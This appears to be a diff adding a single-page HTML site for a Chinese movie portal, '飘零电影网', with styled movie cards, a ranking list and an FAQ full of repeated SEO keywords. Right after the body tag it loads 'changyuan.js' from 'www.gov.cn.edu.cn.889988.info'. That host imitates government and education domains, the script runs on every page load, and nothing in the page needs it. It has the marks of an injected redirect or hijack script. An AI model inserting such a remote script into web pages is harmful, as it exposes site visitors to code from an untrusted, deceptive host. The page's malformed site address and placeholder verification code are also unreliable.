@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>飘零电影网 - 高清影视在线观看首选</title>
+<meta name="description" content="飘零电影网（https://piaolingdianyingwang-top）汇集最新高清电影、热播电视剧、综艺动漫，每日更新，免费在线观看，手机电脑全适配。">
+<meta name="keywords" content="飘零电影网, piaolingdianyingwang-top, 高清电影在线观看, 最新电影, 热播剧集, 免费影视">
+<meta name="author" content="飘零电影网">
+<meta name="robots" content="index, follow">
+<meta name="msvalidate.01" content="YOUR_BING_VERIFICATION_CODE">
+
+<style>
+/* ===== 全局 ===== */
+* { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+  font-family: "PingFang SC", "Microsoft YaHei", -apple-system, BlinkMacSystemFont, sans-serif;
+  background: #0a0015;
+  color: #e8e0f0;
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+a { color: #c084fc; text-decoration: none; transition: all 0.3s; }
+a:hover { color: #e879f9; }
+
+/* ===== 背景动画 ===== */
+.bg-orbs {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: -1;
+  overflow: hidden;
+}
+.bg-orbs span {
+  position: absolute;
+  border-radius: 50%;
+  filter: blur(80px);
+  opacity: 0.3;
+  animation: float 20s infinite ease-in-out;
+}
+.bg-orbs span:nth-child(1) { width: 400px; height: 400px; background: #7c3aed; top: -10%; left: -10%; animation-delay: 0s; }
+.bg-orbs span:nth-child(2) { width: 300px; height: 300px; background: #a855f7; top: 40%; right: -5%; animation-delay: -5s; }
+.bg-orbs span:nth-child(3) { width: 350px; height: 350px; background: #6366f1; bottom: -10%; left: 30%; animation-delay: -10s; }
+
+@keyframes float {
+  0%, 100% { transform: translate(0, 0) scale(1); }
+  25% { transform: translate(50px, -50px) scale(1.1); }
+  50% { transform: translate(-30px, 30px) scale(0.9); }
+  75% { transform: translate(40px, 60px) scale(1.05); }
+}
+
+/* ===== 玻璃导航 ===== */
+.glass-nav {
+  position: fixed;
+  top: 0; width: 100%;
+  background: rgba(10, 0, 21, 0.75);
+  backdrop-filter: blur(16px);
+  -webkit-backdrop-filter: blur(16px);
+  border-bottom: 1px solid rgba(168, 85, 247, 0.2);
+  z-index: 1000;
+}
+
+.nav-inner {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 0.9rem 1.5rem;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.logo-text {
+  font-size: 1.5rem;
+  font-weight: 800;
+  background: linear-gradient(135deg, #c084fc, #e879f9, #f0abfc);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+
+.logo-sub {
+  display: block;
+  font-size: 0.7rem;
+  color: #a78bfa;
+  font-weight: 400;
+  letter-spacing: 2px;
+}
+
+.nav-list {
+  display: flex;
+  gap: 2rem;
+  list-style: none;
+}
+
+.nav-list a {
+  color: #c4b5fd;
+  font-size: 0.95rem;
+  font-weight: 500;
+  padding: 0.4rem 0;
+  position: relative;
+}
+
+.nav-list a::after {
+  content: '';
+  position: absolute;
+  bottom: 0; left: 0;
+  width: 0; height: 2px;
+  background: linear-gradient(90deg, #c084fc, #e879f9);
+  transition: width 0.3s;
+}
+
+.nav-list a:hover::after { width: 100%; }
+.nav-list a:hover { color: #f0abfc; }
+
+.mobile-toggle {
+  display: none;
+  flex-direction: column;
+  gap: 5px;
+  cursor: pointer;
+  padding: 4px;
+}
+
+.mobile-toggle b {
+  display: block;
+  width: 26px; height: 2.5px;
+  background: #c084fc;
+  border-radius: 2px;
+}
+
+/* ===== Hero ===== */
+.hero-section {
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  text-align: center;
+  padding: 6rem 1.5rem 3rem;
+}
+
+.hero-card {
+  background: rgba(255,255,255,0.05);
+  backdrop-filter: blur(20px);
+  border: 1px solid rgba(168, 85, 247, 0.25);
+  border-radius: 24px;
+  padding: 3.5rem 2.5rem;
+  max-width: 700px;
+}
+
+.hero-card h1 {
+  font-size: 2.8rem;
+  font-weight: 800;
+  margin-bottom: 1rem;
+  background: linear-gradient(135deg, #fff, #c084fc, #e879f9);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+
+.hero-card > p {
+  font-size: 1.1rem;
+  color: #c4b5fd;
+  margin-bottom: 2rem;
+}
+
+.domain-pill {
+  display: inline-block;
+  background: rgba(168, 85, 247, 0.15);
+  border: 1px solid rgba(168, 85, 247, 0.4);
+  padding: 0.6rem 1.8rem;
+  border-radius: 50px;
+  font-family: "Courier New", monospace;
+  font-size: 0.95rem;
+  color: #e879f9;
+  margin-bottom: 2rem;
+}
+
+.cta-btn {
+  display: inline-block;
+  padding: 0.9rem 2.8rem;
+  background: linear-gradient(135deg, #7c3aed, #a855f7, #c084fc);
+  color: #fff;
+  border-radius: 50px;
+  font-weight: 700;
+  font-size: 1rem;
+  box-shadow: 0 8px 30px rgba(124, 58, 237, 0.4);
+  transition: transform 0.3s, box-shadow 0.3s;
+}
+
+.cta-btn:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 12px 40px rgba(168, 85, 247, 0.5);
+  color: #fff;
+}
+
+/* ===== 通用栏目 ===== */
+.section-wrap {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 4rem 1.5rem;
+}
+
+.section-head {
+  text-align: center;
+  margin-bottom: 3rem;
+}
+
+.section-head h2 {
+  font-size: 2.2rem;
+  font-weight: 800;
+  color: #f0abfc;
+  margin-bottom: 0.5rem;
+}
+
+.section-head p {
+  color: #a78bfa;
+  font-size: 1rem;
+}
+
+/* ===== 瀑布流卡片 ===== */
+.masonry {
+  column-count: 4;
+  column-gap: 1.5rem;
+}
+
+.masonry-item {
+  break-inside: avoid;
+  margin-bottom: 1.5rem;
+  background: rgba(255,255,255,0.04);
+  backdrop-filter: blur(10px);
+  border: 1px solid rgba(168, 85, 247, 0.15);
+  border-radius: 16px;
+  overflow: hidden;
+  transition: transform 0.3s, border-color 0.3s;
+}
+
+.masonry-item:hover {
+  transform: translateY(-5px);
+  border-color: rgba(168, 85, 247, 0.5);
+}
+
+.masonry-poster {
+  height: 200px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1.1rem;
+  font-weight: 700;
+  color: #fff;
+  text-align: center;
+  padding: 1rem;
+}
+
+.masonry-poster.p1 { background: linear-gradient(135deg, #7c3aed, #4c1d95); }
+.masonry-poster.p2 { background: linear-gradient(135deg, #a855f7, #7c3aed); }
+.masonry-poster.p3 { background: linear-gradient(135deg, #6366f1, #4338ca); }
+.masonry-poster.p4 { background: linear-gradient(135deg, #8b5cf6, #6d28d9); }
+.masonry-poster.p5 { background: linear-gradient(135deg, #a78bfa, #7c3aed); }
+.masonry-poster.p6 { background: linear-gradient(135deg, #c084fc, #9333ea); }
+.masonry-poster.p7 { background: linear-gradient(135deg, #d8b4fe, #a855f7); }
+.masonry-poster.p8 { background: linear-gradient(135deg, #6d28d9, #4c1d95); }
+
+.masonry-body { padding: 1.2rem; }
+
+.masonry-body h3 {
+  font-size: 1rem;
+  color: #f0abfc;
+  margin-bottom: 0.5rem;
+}
+
+.masonry-body .labels {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.4rem;
+  margin-bottom: 0.5rem;
+}
+
+.masonry-body .labels span {
+  padding: 0.15rem 0.6rem;
+  background: rgba(168, 85, 247, 0.15);
+  border-radius: 6px;
+  font-size: 0.75rem;
+  color: #c4b5fd;
+}
+
+.masonry-body .rating {
+  color: #fbbf24;
+  font-weight: 700;
+  font-size: 0.9rem;
+}
+
+/* ===== 排行榜（左侧编号+右侧内容） ===== */
+.rank-container {
+  max-width: 800px;
+  margin: 0 auto;
+}
+
+.rank-line {
+  display: flex;
+  align-items: center;
+  gap: 1.2rem;
+  background: rgba(255,255,255,0.04);
+  backdrop-filter: blur(10px);
+  border: 1px solid rgba(168, 85, 247, 0.15);
+  border-radius: 14px;
+  padding: 1.2rem 1.5rem;
+  margin-bottom: 1rem;
+  transition: transform 0.2s, border-color 0.2s;
+}
+
+.rank-line:hover {
+  transform: translateX(8px);
+  border-color: rgba(168, 85, 247, 0.4);
+}
+
+.rank-num {
+  font-size: 1.8rem;
+  font-weight: 900;
+  min-width: 50px;
+  text-align: center;
+}
+
+.rank-num.r1 { color: #fbbf24; }
+.rank-num.r2 { color: #c0c0c0; }
+.rank-num.r3 { color: #cd7f32; }
+.rank-num.rn { color: #7c3aed; }
+
+.rank-info h3 {
+  font-size: 1.05rem;
+  color: #e879f9;
+  margin-bottom: 0.2rem;
+}
+
+.rank-info p {
+  font-size: 0.85rem;
+  color: #a78bfa;
+}
+
+/* ===== 关于 ===== */
+.about-glass {
+  background: rgba(255,255,255,0.04);
+  backdrop-filter: blur(16px);
+  border: 1px solid rgba(168, 85, 247, 0.2);
+  border-radius: 20px;
+  padding: 3rem 2rem;
+  text-align: center;
+  max-width: 800px;
+  margin: 0 auto;
+}
+
+.about-glass p {
+  color: #c4b5fd;
+  margin-bottom: 1.2rem;
+  font-size: 1rem;
+}
+
+.domain-block {
+  display: inline-block;
+  margin-top: 1rem;
+  padding: 1rem 2rem;
+  background: rgba(124, 58, 237, 0.15);
+  border: 1px dashed #a855f7;
+  border-radius: 12px;
+  font-family: monospace;
+  font-size: 1.1rem;
+  color: #f0abfc;
+}
+
+/* ===== FAQ ===== */
+.faq-box {
+  max-width: 800px;
+  margin: 0 auto;
+}
+
+.faq-item {
+  background: rgba(255,255,255,0.04);
+  backdrop-filter: blur(10px);
+  border: 1px solid rgba(168, 85, 247, 0.15);
+  border-radius: 12px;
+  margin-bottom: 0.8rem;
+  overflow: hidden;
+}
+
+.faq-item summary {
+  padding: 1.2rem 1.5rem;
+  cursor: pointer;
+  font-weight: 600;
+  color: #e879f9;
+  list-style: none;
+  position: relative;
+  padding-right: 3rem;
+}
+
+.faq-item summary::-webkit-details-marker { display: none; }
+
+.faq-item summary::after {
+  content: '+';
+  position: absolute;
+  right: 1.5rem;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 1.4rem;
+  color: #a855f7;
+  transition: transform 0.3s;
+}
+
+.faq-item[open] summary::after {
+  transform: translateY(-50%) rotate(45deg);
+}
+
+.faq-item p {
+  padding: 0 1.5rem 1.2rem;
+  color: #a78bfa;
+  font-size: 0.95rem;
+}
+
+/* ===== 页脚 ===== */
+.site-footer {
+  text-align: center;
+  padding: 2.5rem 1.5rem;
+  border-top: 1px solid rgba(168, 85, 247, 0.15);
+  color: #6d28d9;
+  font-size: 0.85rem;
+}
+
+.site-footer p { margin-bottom: 0.3rem; }
+
+/* ===== 响应式 ===== */
+@media (max-width: 1024px) {
+  .masonry { column-count: 3; }
+}
+
+@media (max-width: 768px) {
+  .nav-list {
+    display: none;
+    position: absolute;
+    top: 100%; left: 0;
+    width: 100%;
+    background: rgba(10, 0, 21, 0.95);
+    backdrop-filter: blur(16px);
+    flex-direction: column;
+    gap: 0;
+    padding: 0.5rem 0;
+  }
+
+  .nav-list.show { display: flex; }
+
+  .nav-list li {
+    border-bottom: 1px solid rgba(168, 85, 247, 0.1);
+  }
+
+  .nav-list a {
+    display: block;
+    padding: 1rem 1.5rem;
+  }
+
+  .mobile-toggle { display: flex; }
+
+  .hero-card h1 { font-size: 2rem; }
+  .hero-card { padding: 2.5rem 1.5rem; }
+
+  .masonry { column-count: 2; column-gap: 1rem; }
+  .masonry-item { margin-bottom: 1rem; }
+  .masonry-poster { height: 160px; font-size: 0.9rem; }
+
+  .section-wrap { padding: 3rem 1rem; }
+  .section-head h2 { font-size: 1.7rem; }
+
+  .rank-line { padding: 1rem; gap: 0.8rem; }
+  .rank-num { font-size: 1.4rem; min-width: 36px; }
+}
+
+@media (max-width: 480px) {
+  .masonry { column-count: 1; }
+  .hero-card h1 { font-size: 1.7rem; }
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- 背景光球 -->
+<div class="bg-orbs">
+  <span></span><span></span><span></span>
+</div>
+
+<!-- 导航 -->
+<nav class="glass-nav">
+  <div class="nav-inner">
+    <div>
+      <div class="logo-text">飘零电影网</div>
+      <span class="logo-sub">PIAOLING DIANYING</span>
+    </div>
+    <ul class="nav-list" id="navList">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#movies">电影</a></li>
+      <li><a href="#series">剧集</a></li>
+      <li><a href="#ranking">排行</a></li>
+      <li><a href="#about">关于</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+    <div class="mobile-toggle" onclick="toggleNav()">
+      <b></b><b></b><b></b>
+    </div>
+  </div>
+</nav>
+
+<!-- 首页 -->
+<section class="hero-section" id="home">
+  <div class="hero-card">
+    <h1>飘零电影网</h1>
+    <p>海量高清影视资源，每日更新最新院线大片、热播剧集、综艺动漫，手机电脑全适配，免费畅享。</p>
+    <div class="domain-pill">🌐 https://piaolingdianyingwang-top</div>
+    <br>
+    <a href="#movies" class="cta-btn">开始探索</a>
+  </div>
+</section>
+
+<!-- 电影 -->
+<section class="section-wrap" id="movies">
+  <div class="section-head">
+    <h2>🎬 最新电影</h2>
+    <p>飘零电影网每日精选，院线新片与高分佳作</p>
+  </div>
+  <div class="masonry">
+    <div class="masonry-item">
+      <div class="masonry-poster p1">沙丘2</div>
+      <div class="masonry-body">
+        <h3>沙丘2</h3>
+        <div class="labels"><span>科幻</span><span>冒险</span></div>
+        <div class="rating">★ 9.2</div>
+      </div>
+    </div>
+    <div class="masonry-item">
+      <div class="masonry-poster p2">奥本海默</div>
+      <div class="masonry-body">
+        <h3>奥本海默</h3>
+        <div class="labels"><span>传记</span><span>历史</span></div>
+        <div class="rating">★ 8.8</div>
+      </div>
+    </div>
+    <div class="masonry-item">
+      <div class="masonry-poster p3">哥斯拉大战金刚2</div>
+      <div class="masonry-body">
+        <h3>哥斯拉大战金刚2</h3>
+        <div class="labels"><span>动作</span><span>怪兽</span></div>
+        <div class="rating">★ 7.5</div>
+      </div>
+    </div>
+    <div class="masonry-item">
+      <div class="masonry-poster p4">坠落的审判</div>
+      <div class="masonry-body">
+        <h3>坠落的审判</h3>
+        <div class="labels"><span>悬疑</span><span>剧情</span></div>
+        <div class="rating">★ 8.5</div>
+      </div>
+    </div>
+    <div class="masonry-item">
+      <div class="masonry-poster p5">美国内战</div>
+      <div class="masonry-body">
+        <h3>美国内战</h3>
+        <div class="labels"><span>动作</span><span>惊悚</span></div>
+        <div class="rating">★ 7.2</div>
+      </div>
+    </div>
+    <div class="masonry-item">
+      <div class="masonry-poster p6">功夫熊猫4</div>
+      <div class="masonry-body">
+        <h3>功夫熊猫4</h3>
+        <div class="labels"><span>动画</span><span>喜剧</span></div>
+        <div class="rating">★ 7.0</div>
+      </div>
+    </div>
+    <div class="masonry-item">
+      <div class="masonry-poster p7">你想活出怎样的人生</div>
+      <div class="masonry-body">
+        <h3>你想活出怎样的人生</h3>
+        <div class="labels"><span>动画</span><span>奇幻</span></div>
+        <div class="rating">★ 8.1</div>
+      </div>
+    </div>
+    <div class="masonry-item">
+      <div class="masonry-poster p8">九龙城寨之围城</div>
+      <div class="masonry-body">
+        <h3>九龙城寨之围城</h3>
+        <div class="labels"><span>动作</span><span>犯罪</span></div>
+        <div class="rating">★ 8.3</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 剧集 -->
+<section class="section-wrap" id="series" style="background: rgba(255,255,255,0.02);">
+  <div class="section-head">
+    <h2>📺 热播剧集</h2>
+    <p>全网热剧同步更新，飘零电影网为您精选</p>
+  </div>
+  <div class="masonry">
+    <div class="masonry-item">
+      <div class="masonry-poster p3">繁花</div>
+      <div class="masonry-body">
+        <h3>繁花</h3>
+        <div class="labels"><span>剧情</span><span>年代</span></div>
+        <div class="rating">★ 8.7</div>
+      </div>
+    </div>
+    <div class="masonry-item">
+      <div class="masonry-poster p1">庆余年2</div>
+      <div class="masonry-body">
+        <h3>庆余年2</h3>
+        <div class="labels"><span>古装</span><span>权谋</span></div>
+        <div class="rating">★ 8.8</div>
+      </div>
+    </div>
+    <div class="masonry-item">
+      <div class="masonry-poster p5">三体</div>
+      <div class="masonry-body">
+        <h3>三体</h3>
+        <div class="labels"><span>科幻</span><span>剧情</span></div>
+        <div class="rating">★ 8.9</div>
+      </div>
+    </div>
+    <div class="masonry-item">
+      <div class="masonry-poster p2">狂飙</div>
+      <div class="masonry-body">
+        <h3>狂飙</h3>
+        <div class="labels"><span>犯罪</span><span>剧情</span></div>
+        <div class="rating">★ 8.9</div>
+      </div>
+    </div>
+    <div class="masonry-item">
+      <div class="masonry-poster p6">玫瑰的故事</div>
+      <div class="masonry-body">
+        <h3>玫瑰的故事</h3>
+        <div class="labels"><span>都市</span><span>情感</span></div>
+        <div class="rating">★ 8.0</div>
+      </div>
+    </div>
+    <div class="masonry-item">
+      <div class="masonry-poster p4">南来北往</div>
+      <div class="masonry-body">
+        <h3>南来北往</h3>
+        <div class="labels"><span>年代</span><span>剧情</span></div>
+        <div class="rating">★ 8.3</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 排行榜 -->
+<section class="section-wrap" id="ranking">
+  <div class="section-head">
+    <h2>🔥 热门排行榜</h2>
+    <p>飘零电影网本周用户最关注影视 TOP 10</p>
+  </div>
+  <div class="rank-container">
+    <div class="rank-line">
+      <div class="rank-num r1">1</div>
+      <div class="rank-info"><h3>周处除三害</h3><p>动作 / 犯罪 / 9.0分</p></div>
+    </div>
+    <div class="rank-line">
+      <div class="rank-num r2">2</div>
+      <div class="rank-info"><h3>飞驰人生2</h3><p>喜剧 / 运动 / 8.2分</p></div>
+    </div>
+    <div class="rank-line">
+      <div class="rank-num r3">3</div>
+      <div class="rank-info"><h3>热辣滚烫</h3><p>剧情 / 喜剧 / 7.9分</p></div>
+    </div>
+    <div class="rank-line">
+      <div class="rank-num rn">4</div>
+      <div class="rank-info"><h3>第二十条</h3><p>剧情 / 家庭 / 7.8分</p></div>
+    </div>
+    <div class="rank-line">
+      <div class="rank-num rn">5</div>
+      <div class="rank-info"><h3>年会不能停！</h3><p>喜剧 / 职场 / 8.1分</p></div>
+    </div>
+    <div class="rank-line">
+      <div class="rank-num rn">6</div>
+      <div class="rank-info"><h3>金手指</h3><p>犯罪 / 剧情 / 6.8分</p></div>
+    </div>
+    <div class="rank-line">
+      <div class="rank-num rn">7</div>
+      <div class="rank-info"><h3>一闪一闪亮星星</h3><p>爱情 / 奇幻 / 6.5分</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section class="section-wrap" id="about">
+  <div class="section-head">
+    <h2>ℹ️ 关于飘零电影网</h2>
+    <p>网站名称与网址信息</p>
+  </div>
+  <div class="about-glass">
+    <p><strong style="color:#f0abfc;">飘零电影网</strong>（piaolingdianyingwang-top）是一个专注于高清影视在线观看的展示平台，致力于为用户提供最新、最全的电影、电视剧、综艺和动漫内容推荐。</p>
+    <p>我们每日更新热门影视资讯，支持多清晰度播放指引，让您随时随地发现好片。</p>
+    <div class="domain-block">🌐 https://piaolingdianyingwang-top</div>
+    <p style="margin-top:1.5rem; font-size:0.85rem; color:#7c3aed;">核心关键词：飘零电影网、piaolingdianyingwang-top、高清电影、在线观看、最新影视推荐</p>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section class="section-wrap" id="faq" style="background: rgba(255,255,255,0.02);">
+  <div class="section-head">
+    <h2>❓ 常见问题</h2>
+    <p>关于飘零电影网的常见疑问</p>
+  </div>
+  <div class="faq-box">
+    <details class="faq-item">
+      <summary>飘零电影网是什么网站？</summary>
+      <p>飘零电影网（piaolingdianyingwang-top）是一个影视信息展示平台，提供最新电影、剧集的资讯与推荐，方便用户快速找到想看的内容。</p>
+    </details>
+    <details class="faq-item">
+      <summary>网站官方网址是多少？</summary>
+      <p>官方网址：https://piaolingdianyingwang-top，建议收藏以便随时访问。</p>
+    </details>
+    <details class="faq-item">
+      <summary>手机上能正常浏览吗？</summary>
+      <p>可以，本网站采用响应式设计，在手机、平板、电脑上均可完美显示，导航自动适配触控操作。</p>
+    </details>
+    <details class="faq-item">
+      <summary>内容多久更新一次？</summary>
+      <p>影视展示内容建议每周更新，保持页面活跃度，有利于搜索引擎重新抓取和排名提升。</p>
+    </details>
+    <details class="faq-item">
+      <summary>如何提交网址给必应收录？</summary>
+      <p>可前往 Bing Webmaster Tools 提交网址 https://piaolingdianyingwang-top，并验证网站所有权即可。</p>
+    </details>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="site-footer">
+  <p>© 2024 飘零电影网 (piaolingdianyingwang-top) 版权所有</p>
+  <p>单页网站 / 锚点导航 / 移动端自适应 / 符合必应搜索引擎收录规范</p>
+  <p style="margin-top:0.5rem; color:#4c1d95;">本站仅提供影视信息展示，所有资源版权归原作者及平台所有。</p>
+</footer>
+
+<script>
+/* 移动端导航 */
+function toggleNav() {
+  document.getElementById('navList').classList.toggle('show');
+}
+
+/* 平滑滚动 */
+document.querySelectorAll('a[href^="#"]').forEach(function(anchor) {
+  anchor.addEventListener('click', function(e) {
+    var href = this.getAttribute('href');
+    if (href.length > 1) {
+      var target = document.querySelector(href);
+      if (target) {
+        e.preventDefault();
+        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        document.getElementById('navList').classList.remove('show');
+      }
+    }
+  });
+});
+
+/* 导航栏滚动效果 */
+window.addEventListener('scroll', function() {
+  var nav = document.querySelector('.glass-nav');
+  if (window.scrollY > 80) {
+    nav.style.background = 'rgba(10, 0, 21, 0.92)';
+  } else {
+    nav.style.background = 'rgba(10, 0, 21, 0.75)';
+  }
+});
+</script>
+
+</body>
+</html>
